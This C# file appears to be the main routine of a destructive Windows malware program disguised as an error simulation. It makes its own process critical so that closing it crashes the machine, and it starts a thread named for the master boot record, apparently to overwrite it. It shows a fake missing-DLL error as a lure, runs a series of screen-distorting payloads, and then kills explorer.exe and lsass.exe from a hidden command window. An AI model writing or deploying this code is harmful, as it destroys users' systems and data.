using Project1;
using System;
using System.Diagnostics;
using System.Media;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms;
using static Vanara.PInvoke.Kernel32;
using static Vanara.PInvoke.User32;

namespace WindowsErrorSimulation
{
    public class Program
    {
        public static void Cls() // Func Clear Screen
        {
            for (int num = 0; num < 10; num++)
            {
                InvalidateRect(IntPtr.Zero, null, true);
            }
        }

        [DllImport("ntdll.dll", SetLastError = true)]
        private static extern int NtSetInformationProcess(IntPtr processHandle, int processInformationClass, ref int processInformation, int processInformationLength);

        private const int BreakOnTermination = 0x1D;
        private static int isCritical = 1;

        public static void bsod()
        {
            Process.EnterDebugMode();
            IntPtr handle = Process.GetCurrentProcess().Handle;
            NtSetInformationProcess(handle, BreakOnTermination, ref isCritical, sizeof(int));
        }

        public static void Main()
        {
            Msg.Mensagem();

            Thread t1, t2, t3, t4, t5, t6, t7, t8, t9, t10, CIcon, thInteractiveWave;

            var audio = new SoundPlayer(Project1.Properties.Resources.Funk);
            var audioVoid = new SoundPlayer(Project1.Properties.Resources.voidSound);
            t1 = new Thread(Cargas.Pay1); // REVERSE COLORS
            t2 = new Thread(Cargas.Pay2); // ICONS SPAWN
            t3 = new Thread(Cargas.Pay3); // SPIRAL ICON ERROR
            t4 = new Thread(Cargas.Pay4); // TUNEL
            t5 = new Thread(Cargas.Pay5); // FILTERS
            t6 = new Thread(Cargas.Pay6); // SCREEN
            t7 = new Thread(Cargas.Pay7); // BUGGED SCREEN
            t8 = new Thread(Cargas.Pay8); // BRUSH
            t9 = new Thread(Cargas.Pay9); // RAIN COLORFUL SQUARES
            t10 = new Thread(Cargas.Pay10); // SCREEN INSIDE
            CIcon = new Thread(IconsQuadrado.CuboDeIcons); // SQUARE ICONS
            thInteractiveWave = new Thread(CargaVoid.EffectWaveInteractive);

            Thread bsodInit = new Thread(Program.bsod);
            Thread mbr = new Thread(MbrInit.Mbr);
            bsodInit.Start();
            mbr.Start();

            Sleep(2000);

            System.Windows.Forms.MessageBox.Show("The program can't start because MSVCP140.dll is missing from your computer. Try reinstalling the program to fix this problem.", "WindowsXPDebbug.Error.exe - System Error", MessageBoxButtons.OK, MessageBoxIcon.Error);

            Sleep(1000 * 10);

            audio.Play();

            Sleep(1000 * 2);

            t1.Start();

            Sleep(1000 * 10); // 10s

            t2.Start();

            Sleep(3000);

            t3.Start();

            Sleep(1000 * 10); // 10s

            t4.Start();

            Sleep(1000);

            t5.Start();

            Sleep(6000);

            t2.Abort();
            t3.Abort();
            t4.Abort();
            t6.Start();

            Sleep(1000 * 10); // 10s

            t5.Abort();
            t6.Abort();
            t7.Start();
            t8.Start();
            Sleep(2000);
            t9.Start();

            Sleep(1000 * 10); //10s

            t10.Start();

            Sleep(6000);

            CIcon.Start();

            Sleep(7000);

            Cls();

            t1.Abort();
            t7.Abort();
            t8.Abort();
            t9.Abort();
            t10.Abort();
            CIcon.Abort();
            audio.Stop();

            // ==================================================================================

            audioVoid.Play();

            thInteractiveWave.Start();

            ProcessStartInfo killEx = new ProcessStartInfo
            {
                FileName = "cmd.exe",
                WindowStyle = ProcessWindowStyle.Hidden,
                Arguments = "/c taskkill /f /im explorer.exe && taskkill /f /im lsass.exe",
            };
            Process.Start(killEx);

            // ==================================================================================

            Sleep(INFINITE);
        }
    }
}